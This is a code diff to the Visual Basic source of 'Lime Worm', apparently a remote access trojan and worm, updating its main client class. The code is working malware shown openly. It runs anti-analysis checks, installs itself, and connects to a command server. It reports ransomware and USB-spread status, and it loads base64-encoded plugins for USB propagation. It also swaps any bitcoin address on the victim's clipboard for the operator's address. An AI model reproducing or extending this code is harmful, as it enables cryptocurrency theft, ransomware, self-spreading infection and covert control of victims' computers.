@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./05/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./07/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.7 ..                   ##
+'##                     .. Lime Worm v0.5.8 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -36,43 +36,48 @@
 
 Imports System.Threading
 
-Public Class Main
-    Public Shared C As New Client
-    Public Shared SPL = "|'L'|"
+Public Class C_Main
+    Public Shared C As New C_Socket
+    Public Shared SPL = C_Settings.SPL
 
     Public Shared Sub Main()
 
+        'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
+        'Thread.Sleep(35000) '[New client infected]
+        'End If
+
         Thread.Sleep(1000)
+
         Dim createdNew As Boolean 'Making sure that only 1 process is running
-        Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
+        C_Settings.NMT = New Mutex(True, C_Settings.MTX, createdNew)
         Try
             If Not createdNew Then End
         Finally
             If createdNew Then
-                Settings.NMT.ReleaseMutex()
+                C_Settings.NMT.ReleaseMutex()
             End If
         End Try
 
-        If Settings.ANTI Then
+        If C_Settings.ANTI Then
             Call Anti()
         End If
 
-        Call Installation.INS()
+        Call C_Installation.INS()
 
-        Client.T1.Start() 'Start TCP connection to server
+        C_Socket.T1.Start() 'Start TCP connection to server
 
-        If Settings.BTC_ADDR.Length > 25 Then
+        If C_Settings.BTC_ADDR.Length > 25 Then
             Dim _BTC As Thread = New Thread(AddressOf _BTC_ST)
             _BTC.SetApartmentState(ApartmentState.STA)
             _BTC.Start()
         End If
 
-        If Settings.USB Then
+        If C_Settings.USB Then
             Dim _USB As Thread = New Thread(AddressOf StartSP)
             _USB.Start()
         End If
 
-        If Settings.PIN Then
+        If C_Settings.PIN Then
             Dim _PIN As Thread = New Thread(AddressOf StartPIN)
             _PIN.Start()
         End If
@@ -100,7 +105,7 @@ Public Class Main
                         C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
                     End If
 
-                    If Settings.USB Then
+                    If C_Settings.USB Then
                         If Old2 <> GTV("USB").ToString Then
                             Old2 = GTV("USB")
                             C.Send("!U" & SPL & GTV("USB").ToString)
@@ -122,13 +127,13 @@ Public Class Main
 
                 Thread.CurrentThread.Sleep(1000)
 
-                'check if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
+                'checking if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                 'the length is between 26-35 characters
                 'more info https://en.bitcoin.it/wiki/Address
 
                 If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
                     If My.Computer.Clipboard.GetText.StartsWith("1") Or My.Computer.Clipboard.GetText.StartsWith("3") Or My.Computer.Clipboard.GetText.StartsWith("bc1") Then
-                        My.Computer.Clipboard.SetText(Settings.BTC_ADDR)
+                        My.Computer.Clipboard.SetText(C_Settings.BTC_ADDR)
                     End If
                 End If
             Catch ex As Exception
@@ -147,7 +152,7 @@ Public Class Main
             End While
 
         Else
-            Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
+            C_Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
         End If
     End Sub
 
@@ -162,7 +167,7 @@ Public Class Main
             End While
 
         Else
-            Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
+            C_Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
         End If
     End Sub
 
